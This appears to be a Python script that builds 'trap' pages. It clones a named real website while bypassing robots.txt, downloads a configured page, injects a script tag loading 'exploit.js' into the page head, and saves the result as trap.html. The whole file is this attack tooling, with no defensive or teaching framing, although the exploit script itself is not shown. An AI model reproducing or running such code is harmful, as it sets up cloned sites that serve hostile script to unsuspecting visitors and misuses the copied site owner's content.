import urllib.request
import pyFiles.config as config
from bs4 import BeautifulSoup
from pywebcopy import save_webpage
import os


def downloadHTML():
    url = 'http://schoett-web.de'
    download_folder = os.path.relpath("/templates/trap/trap-page")


    kwargs = {'bypass_robots': True, 'project_name': 'trap-page'}

    save_webpage(url, download_folder, **kwargs)

def downloadHTML2():
    url = config.url

    urllib.request.urlretrieve(url, "templates/trap/webpage.html")

    html = open("templates/trap/webpage.html").read()

    soup = BeautifulSoup(html, "html.parser")
    new_js = soup.new_tag("script", src="exploit.js")
    soup.head.append(new_js)
    print(new_js)

    with open("templates/trap/trap.html", "wb") as f_output:
        f_output.write(soup.prettify("utf-8"))